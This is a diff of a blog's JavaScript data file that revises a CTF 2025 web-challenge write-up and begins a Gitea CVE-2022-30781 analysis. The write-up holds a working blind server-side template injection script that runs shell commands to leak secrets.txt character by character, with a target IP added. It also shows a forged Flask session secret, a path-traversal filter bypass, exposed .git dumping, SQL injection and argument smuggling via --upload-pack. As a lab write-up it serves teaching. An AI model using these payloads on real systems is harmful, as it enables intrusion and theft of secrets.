@@ -221,88 +221,115 @@ if __name__ == "__main__":
 <li><a href="https://docs.docker.com/engine/api/" target="_blank" rel="noopener">Docker Engine API Documentation</a></li></ul>`},
  {id:"cit-ctf",date:"2025-04-28",y:"2025",m:"Apr 28",title:"CIT CTF 2025: solving all web challenges",tag:"ctf",src:"Medium",url:"https://mindpatch.medium.com/cit-ctf-2025-solving-all-web-challenges-e9697670ae1f",
   full:`<p>Hello, I joined the CTF for fun during the weekend.</p>
-<p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p>
+<p>I focused on web challenges and completed all of them in the category. The challenges were straightforward and made for a fun weekend.</p>
 <h2>Mr. Chatbot</h2>
-<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&#x27;t an LLM attack - responses came from JavaScript files.</p>
+<img src="https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png" alt="Mr. Chatbot challenge">
+<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the flag from the bot. This wasn't an LLM attack &mdash; the responses came from JavaScript files.</p>
+<img src="https://miro.medium.com/v2/resize:fit:952/1*RXw88Zwtk6JNglc_pSVzTQ.png" alt="Chat interface">
 <p>After entering a name, you get a session value that can be decoded with flask-unsign:</p>
-<pre><code class="language-bash">$ flask-unsign --unsign --cookie &quot;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk&quot; --secret=&quot;9f3IC3uj9^zZ&quot;
-[*] Session decodes to: {&#x27;admin&#x27;: &#x27;0&#x27;, &#x27;name&#x27;: &#x27;hacker&#x27;}</code></pre>
-<p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p>
-<pre><code class="language-bash">$ flask-unsign --unsign --cookie &quot;.eJwdzE0Lgj...&quot; --secret=&quot;9f3IC3uj9^zZ&quot;
-[*] Session decodes to: {&#x27;admin&#x27;: &#x27;1&#x27;, &#x27;name&#x27;: &quot;hacker&quot;, &#x27;uid&#x27;: &#x27;...&#x27;}</code></pre>
-<p>As you see there&#x27;s a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p>
-<p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p>
+<pre><code class="language-bash">$ flask-unsign --unsign --cookie "eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk" --secret="9f3IC3uj9^zZ"
+[*] Session decodes to: {'admin': '0', 'name': 'hacker'}</code></pre>
+<img src="https://miro.medium.com/v2/resize:fit:952/1*lZwyPZ9_OqenlmQWuCAssg.png" alt="Session decoding">
+<p>After trying injections with no luck, I did some parameter fuzzing and found the <code>admin=1</code> parameter. It revealed new session data:</p>
+<img src="https://miro.medium.com/v2/resize:fit:667/1*1TuqK6xE0XGYJz-DQD50oQ.png" alt="Admin parameter">
+<pre><code class="language-bash">$ flask-unsign --unsign --cookie ".eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakyssUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM" --secret="9f3IC3uj9^zZ"
+[*] Session decodes to: {'admin': '1', 'name': "hacker", 'uid': 'L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs='}</code></pre>
+<p>As you can see there's a new variable (<strong>UID</strong>). I tried some injections like SSTI and got it :)</p>
+<img src="https://miro.medium.com/v2/resize:fit:667/1*GdcyUtROwNfXlDF7_ViIVw.png" alt="SSTI success">
+<p>The idea now was to read <code>secrets.txt</code> blindly, so I wrote a script that runs the <code>head</code> command and sleeps 5 seconds when a character matches:</p>
 <pre><code class="language-python">import requests
 import string
 import time
 
 CHARS = string.printable
-FOUND = &quot;&quot;
+FOUND = ""
 POSITION = len(FOUND) + 1
 
 def make_payload(position, the_char):
-    cmd = f&#x27;[ &quot;$(head -c {position} secrets.txt | tail -c 1)&quot; = &quot;{the_char}&quot; ] &amp;&amp; sleep 5&#x27;
-    payload = &quot;{{ self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;&quot;+cmd+&quot;&#x27;).read() }}&quot;
+    # Compare a single character of the target file
+    cmd = f'[ "$(head -c {position} secrets.txt | tail -c 1)" = "{the_char}" ] &amp;&amp; sleep 5'
+    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('"+cmd+"').read() }}"
     return payload
 
 def exploit():
     global FOUND, POSITION
-    max_positions = 100
-    consecutive_spaces = 0
+    max_positions = 100          # reasonable limit
+    consecutive_spaces = 0       # detect end of file
+
     while POSITION &lt;= max_positions and consecutive_spaces &lt; 5:
         found_char = False
         for ch in CHARS:
-            if ch in [&#x27;&quot;&#x27;, &#x27;\\\\&#x27;, &#x27;\`&#x27;, &#x27;$&#x27;, &#x27;&amp;&#x27;, &#x27;|&#x27;, &#x27;;&#x27;, &#x27;\\n&#x27;, &#x27;\\r&#x27;]:
+            if ch in ['"', '\\\\', '\`', '$', '&amp;', '|', ';', '\\n', '\\r']:  # skip problematic chars
                 continue
+            print(f"Position {POSITION}, trying character: {ch}")
             start_time = time.time()
             try:
                 r = requests.post(
-                    &quot;http://target/&quot;,
+                    "http://23.179.17.40:58005/",
                     allow_redirects=False,
-                    data={&quot;name&quot;: make_payload(POSITION, ch), &quot;admin&quot;: &quot;1&quot;},
-                    timeout=10
+                    data={"name": make_payload(POSITION, ch), "admin": "1"},
+                    proxies={"http": "http://localhost:8080"},
+                    timeout=10,
                 )
-                if time.time() - start_time &gt;= 4.5:
-                    FOUND += ch; found_char = True
-                    consecutive_spaces = 0 if ch != &#x27; &#x27; else consecutive_spaces + 1
-                    print(f&quot;pos {POSITION}: {ch}  -&gt;  {FOUND}&quot;)
+                elapsed_time = time.time() - start_time
+                if elapsed_time &gt;= 4.5:              # threshold with margin for jitter
+                    FOUND += ch
+                    found_char = True
+                    consecutive_spaces = 0 if ch != ' ' else consecutive_spaces + 1
+                    print(f"Found character at position {POSITION}: {ch}")
+                    print(f"Current secret: {FOUND}")
                     break
-            except requests.exceptions.Timeout:
-                FOUND += ch; found_char = True
-                consecutive_spaces = 0 if ch != &#x27; &#x27; else consecutive_spaces + 1
+            except requests.exceptions.Timeout:      # timeout also means a match
+                FOUND += ch
+                found_char = True
+                consecutive_spaces = 0 if ch != ' ' else consecutive_spaces + 1
+                print(f"Found character at position {POSITION} (timeout): {ch}")
+                print(f"Current secret: {FOUND}")
                 break
+            except Exception as e:
+                print(f"Error with character {ch} at position {POSITION}: {e}")
+
         if not found_char:
-            FOUND += &quot; &quot;; consecutive_spaces += 1
+            FOUND += " "
+            consecutive_spaces += 1
+            print(f"No character at position {POSITION}, adding space and continuing")
+
         POSITION += 1
         time.sleep(1)
 
-if __name__ == &quot;__main__&quot;:
+def main():
+    print(f"Starting blind exploitation from: {FOUND}")
+    print(f"Starting at position: {POSITION}")
     exploit()
-    print(&quot;secret:&quot;, FOUND)</code></pre>
-<p>And after running it got the flag :)</p>
+    print(f"Final extracted secret: {FOUND}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+<p>And after running it, got the flag :)</p>
 <pre><code class="language-bash">$ python exp.py
 admin:9f3IC3uj9^zZ  CIT{18a7fbedb4f3548f}</code></pre>
 <h2>How I Parsed your JSON</h2>
 <p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p>
-<p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p>
-<p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p>
+<p>The useful finding was turning the <code>container</code> parameter into a list with <code>?container[]=</code>. That surfaced a debug page with source code.</p>
+<img src="https://miro.medium.com/v2/resize:fit:667/1*HpShJFda_vKXHxW6UGpBfA.png" alt="Debug page">
+<p>The code simply strips <code>../</code> and file extensions from the container name to prevent LFI. It can be bypassed with <code>..//file.txt.txt</code>:</p>
 <pre><code>/select?record=*&amp;container=../../../..//app//secrets.txt.txt</code></pre>
+<img src="https://miro.medium.com/v2/resize:fit:667/1*KhKFV2iS03LRGP23UU74KA.png" alt="LFI bypass result">
 <h2>Commit &amp; Order: Version Control Unit</h2>
-<p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p>
-<p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p>
+<p>This one was straightforward. I found an exposed <code>/.git</code> directory on the server and dumped the repository with git-dump.</p>
+<p>Looking through the commit history, older commits still held source code with hardcoded admin credentials &mdash; a classic mistake where secrets are removed in a later commit but remain in history.</p>
 <p>The steps to solve were:</p>
-<ol><li>Identify the exposed Git repository at <code>/.git</code></li><li>Download the repository using git-dump</li><li>Review commit history with <code>git log</code></li><li>Check older commits with <code>git show [commit-hash]</code></li><li>Find the source code file containing the hardcoded admin password in admin.php</li><li>Use the credentials to access the admin panel and retrieve the flag</li></ol>
+<ol><li>Identify the exposed Git repository at <code>/.git</code></li><li>Download the repository using git-dump</li><li>Review commit history with <code>git log</code></li><li>Check older commits with <code>git show [commit-hash]</code></li><li>Find the source file with the hardcoded admin password in admin.php</li><li>Use the credentials to reach the admin panel and grab the flag</li></ol>
 <h2>Breaking Authentication</h2>
-<p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p>
+<p>This challenge had a straightforward SQL injection in the login page.</p>
 <p>Steps to solve:</p>
-<ol><li>Accessed the database and dumped its contents</li><li>Found the flag stored in the &#x27;secrets&#x27; table</li></ol>
-<p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application&#x27;s authentication mechanism.</p>
+<ol><li>Accessed the database and dumped its contents</li><li>Found the flag stored in the <code>secrets</code> table</li></ol>
+<p>A classic unsanitized input field letting SQL injection defeat the authentication mechanism.</p>
 <h2>Keeping Up with the Credentials</h2>
-<p>This challenge required first solving another challenge to obtain valid username and password credentials.</p>
+<p>This one required solving another challenge first to obtain valid credentials.</p>
 <p>Steps to solve:</p>
-<ol><li>Used credentials obtained from the previous challenge to log in</li><li>After login, got redirected to <code>/debug.php</code> which was an empty page</li><li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li><li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li><li>Successfully redirected to <code>/admin.php</code> with admin privileges</li><li>Retrieved the flag from the admin page</li></ol>
-<p>Pretty Simple :v</p>`},
- {id:"analysis-of-cve-2022-30781",date:"2025-01-10",y:"2025",m:"Jan 10",title:"CVE-2022-30781: how git fetch led to RCE in Gitea",tag:"research",cve:"CVE-2022-30781",src:"Medium",url:"https://mindpatch.medium.com/analysis-of-cve-2022-30781-5089f9616957",
+<ol><li>Used credentials from the previous challenge to log in</li><li>After login, got redirected to <code>/debug.php</code>, an empty page</li><li>Noticed that visiting <code>/admin.php</code> directly logged you out</li><li>Modified the login request to include <code>admin=true</code> via POST</li><li>Got redirected to <code>/admin.php</code> with admin privileges</li><li>Retrieved the flag from the admin page</li></ol>
+<p>Pretty simple :v</p>`}, {id:"analysis-of-cve-2022-30781",date:"2025-01-10",y:"2025",m:"Jan 10",title:"CVE-2022-30781: how git fetch led to RCE in Gitea",tag:"research",cve:"CVE-2022-30781",src:"Medium",url:"https://mindpatch.medium.com/analysis-of-cve-2022-30781-5089f9616957",
   body:`<p>A root-cause analysis of CVE-2022-30781, a remote code execution bug in Gitea's repository migration feature. Gitea ran <code>git fetch</code> against a user-supplied remote, and an attacker-controlled value could smuggle in the <code>--upload-pack</code> option to run an arbitrary command on the server.</p>
   <h2>The chain</h2>
   <ul><li>Repo migration triggers a server-side <code>git fetch</code></li><li>The <code>--upload-pack</code> option lets you point Git at a command instead of the real helper</li><li>Injecting it turns "fetch a repo" into "run my command"</li></ul>
